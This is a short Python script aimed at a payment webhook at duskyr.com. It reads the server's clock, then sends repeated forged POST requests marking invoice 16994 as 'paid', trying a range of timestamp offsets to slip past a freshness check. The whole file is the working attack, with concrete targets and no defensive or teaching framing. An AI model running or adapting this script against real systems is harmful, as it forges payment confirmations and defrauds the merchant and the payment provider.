import json, urllib.request, urllib.error, email.utils, time

def run(**kwargs):
    url = kwargs.get("url", "https://duskyr.com/api/helmer/webhook")
    invoice = int(kwargs.get("invoice", 16994))
    status = kwargs.get("status", "paid")
    # captured Date header: Sat, 05 Sep 2026 19:51:50 GMT -> epoch 1788637910
    base = int(kwargs.get("base", 1788637910))
    # try to refresh from server clock, fall back silently if UA-blocked
    try:
        req = urllib.request.Request("https://payment.duskyr.com/pay/1/status")
        with urllib.request.urlopen(req, timeout=12) as r:
            date_hdr = r.headers.get("Date")
            base = email.utils.mktime_tz(email.utils.parsedate_tz(date_hdr))
            out = [f"server_epoch_refreshed={base} ({date_hdr})"]
    except Exception as e:
        out = [f"clock_read_failed ({e}); using cached base={base}"]
    offsets = [0, 3, 10, 30, 60, 300, 1800]
    for off in offsets:
        for name, ts in [("sec", base + off), ("ms", (base + off) * 1000)]:
            body = json.dumps({"id": invoice, "status": status, "timestamp": ts})
            req2 = urllib.request.Request(url, data=body.encode(), method="POST",
                headers={"Content-Type": "application/json"})
            try:
                with urllib.request.urlopen(req2, timeout=12) as r2:
                    out.append(f"{name}+{off}s ts={ts} -> {r2.status} {r2.read().decode()[:150]}")
            except urllib.error.HTTPError as e2:
                out.append(f"{name}+{off}s ts={ts} -> {e2.code} {e2.read().decode()[:150]}")
            except Exception as e3:
                out.append(f"{name}+{off}s ts={ts} -> ERR {e3}")
    return "\n".join(out)

